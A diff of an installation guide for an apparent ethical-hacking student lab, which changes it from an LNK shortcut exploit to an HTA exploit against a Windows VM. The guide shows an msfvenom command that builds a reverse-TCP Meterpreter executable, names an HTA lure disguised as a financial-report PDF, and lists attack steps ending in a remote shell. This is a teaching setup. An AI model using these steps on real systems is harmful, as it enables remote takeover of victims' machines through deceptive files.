@@ -1,7 +1,7 @@
 # Installation Guide
-## Ethical Hacking Lab - LNK Exploit
+## Ethical Hacking Lab - HTA Exploit
 
-Complete step-by-step installation instructions for the LNK (Windows Shortcut) exploit lab.
+Complete step-by-step installation instructions for the HTA (HTML Application) exploit lab.
 
 ---
 
@@ -242,8 +242,8 @@ cd ethical-hacking-student-lab
   - Creates VM with 3GB RAM, 2 CPUs
   - Configures network (192.168.56.101)
   - Installs Metasploit and tools
-  - Generates PowerShell payload
-  - Generates malicious LNK file
+  - Generates Meterpreter EXE payload
+  - Generates malicious HTA file
   - Sets up HTTP server (auto-starts on boot)
 
 [5/7] Building Windows Server 2008 R2 VM (20-30 minutes)
@@ -303,15 +303,15 @@ Expected: `4 packets transmitted, 4 received, 0% packet loss`
 
 ```bash
 vagrant ssh kali
-ls -la /vagrant/exploits/lnk/
+ls -la /vagrant/exploits/hta/
 ```
 
 Expected files:
 ```
-shell.ps1                       # PowerShell Meterpreter payload
-Q4_Financial_Report.pdf.lnk     # Malicious LNK file
-start_lnk_attack.sh             # Attack automation script
-README.txt                      # Instructions
+update.exe                      # Meterpreter EXE payload
+Q4_Financial_Report_EXE.pdf.hta # Malicious HTA file
+start_hta_attack.sh             # Attack automation script
+README.md                       # Instructions
 ```
 
 ---
@@ -325,14 +325,14 @@ README.txt                      # Instructions
 cd vagrant
 vagrant ssh kali
 
-# 2. Navigate to LNK exploits
-cd /vagrant/exploits/lnk
+# 2. Navigate to HTA exploits
+cd /vagrant/exploits/hta
 
 # 3. Start the attack
-./start_lnk_attack.sh
+./start_hta_attack.sh
 
-# 4. In Windows VM, copy Q4_Financial_Report.pdf.lnk to Desktop
-# 5. Double-click the "PDF"
+# 4. In Windows VM, double-click "Download_Exploit_from_Kali" on Desktop
+# 5. Double-click the downloaded "Q4_Financial_Report.pdf"
 # 6. Meterpreter session should open!
 ```
 
@@ -443,17 +443,17 @@ win.vm.boot_timeout = 900  # 15 minutes
 
 ### Exploit Generation Issues
 
-**LNK file not created:**
+**HTA file not created:**
 ```bash
 # SSH into Kali
 vagrant ssh kali
 
 # Manually run provisioning script
 cd /vagrant/vagrant/provisioning/kali
-./create_lnk_exploit.sh
+./create_hta_exploit.sh
 ```
 
-**PowerShell payload missing:**
+**EXE payload missing:**
 ```bash
 # Generate manually
 msfvenom -p windows/x64/meterpreter/reverse_tcp \
@@ -461,8 +461,8 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp \
     LPORT=4444 \
     -a x64 \
     --platform windows \
-    -f psh \
-    -o /vagrant/exploits/lnk/shell.ps1
+    -f exe \
+    -o /vagrant/exploits/hta/update.exe
 ```
 
 ---
@@ -552,7 +552,7 @@ sudo usermod -aG vboxusers $USER
 
 Once installation is complete:
 
-1. Read [LNK_EXPLOIT_GUIDE.md](LNK_EXPLOIT_GUIDE.md) for attack details
+1. Read [exploits/hta/README.md](exploits/hta/README.md) for attack details
 2. Read [HOW_TO_USE.md](HOW_TO_USE.md) for usage instructions
 3. Run your first attack
 4. Explore Meterpreter commands
@@ -579,5 +579,5 @@ If installation fails:
 
 ---
 
-*Last Updated: 2026-01-09*
-*Version: 2.0 - LNK Exploit Lab*
+*Last Updated: 2026-01-10*
+*Version: 2.0 - HTA Exploit Lab*
